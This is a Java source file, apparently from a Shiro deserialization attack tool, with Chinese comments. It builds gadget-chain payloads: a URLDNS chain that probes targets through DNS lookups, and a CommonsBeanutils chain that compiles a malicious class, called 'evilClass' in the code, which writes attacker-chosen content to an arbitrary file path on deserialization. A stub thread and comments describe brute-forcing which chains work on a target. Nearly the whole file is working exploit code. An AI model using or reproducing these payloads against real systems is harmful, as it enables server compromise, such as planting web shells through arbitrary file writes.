package Util;


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.beanutils.BeanComparator;

import java.lang.reflect.Field;
import java.net.URL;
import java.util.*;

public class GadGets {
    // 爆破结束后可用的利用链
    List availableGadgets = new ArrayList();

    static class BlastThread extends Thread {
        @Override
        public void run() {
            Thread.currentThread().setName("子线程");

            // 写反射代码 获取当前类下所有方法 排除不需要方法
            // 爆破利用链时 不爆破到一个就停止 爆破所有利用链 全部存储 然后选中随机利用链代码进行利用

            for (int i = 0; i < 5; i++) {
                System.out.println(Thread.currentThread().getName() + "---" + i);
            }
        }
    }


    public static Object blastGadgets() {
        BlastThread myThread = new BlastThread();
        myThread.start();  //开辟新线程
        for (int i = 0; i < 5; i++) {
            System.out.println(Thread.currentThread().getName() + "---" + i);
        }
        return "CB1";
    }


    /**
     * URLDNS 利用链
     *
     * @param urldns
     * @return
     * @throws Exception
     */
    public static HashMap URLDNS(String urldns) throws Exception {
        HashMap<URL, Integer> hashmap = new HashMap<URL, Integer>();
        URL url = new URL(urldns);
        Class urlClass = url.getClass();
        Field field = urlClass.getDeclaredField("hashCode");//得到URL类的hashCode字段（默认为-1）
        //getDeclaredFields：获取当前类的所有字段，包括 protected/默认/private 修饰的字段；不包括父类public 修饰的字段。
        field.setAccessible(true);
        field.set(url, 3);//设置url的hashCode值为3
        hashmap.put(url, 1);//
        field.set(url, -1);
        return hashmap;
    }

    /**
     * 改造过的CB链 不需要cc依赖 简称Shiro无依赖CB链
     *
     * @param fileName
     * @param fileContent
     * @return
     * @throws Exception
     */
    public static PriorityQueue CB1(String fileName, String fileContent) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass payload = pool.makeClass(randomClassName());
        payload.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        // 创建类构造器代码
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, payload);
        constructor.setBody("{\n" +
                "    java.util.Formatter formatter = new java.util.Formatter(new java.io.File(\"" + fileName + "\"));\n" +
                "    formatter.format(\"%s\", new Object[]{\"" + fileContent + "\"});\n" +
                "    formatter.close();\n" +
                "}");
        payload.addConstructor(constructor);

        byte[] evilClass = payload.toBytecode();
        TemplatesImpl templates = new TemplatesImpl();

        setFieldValue(templates, "_bytecodes", new byte[][]{evilClass});
        setFieldValue(templates, "_name", "test");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        queue.add("1");
        queue.add("1");

        setFieldValue(beanComparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});

        return queue;
    }

    /**
     * 工具类 简化反射流程
     *
     * @param object
     * @param fieldName
     * @param value
     * @throws Exception
     */
    private static void setFieldValue(Object object, String fieldName, Object value) throws Exception {
        Field field = object.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object, value);
    }

    private static String randomClassName() {
        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        Random random = new Random();
        StringBuilder sb = new StringBuilder();

        for (int i = 0; i < 8; i++) {
            int index = random.nextInt(characters.length());
            char randomChar = characters.charAt(index);
            sb.append(randomChar);
        }
        return sb.toString();
    }
}
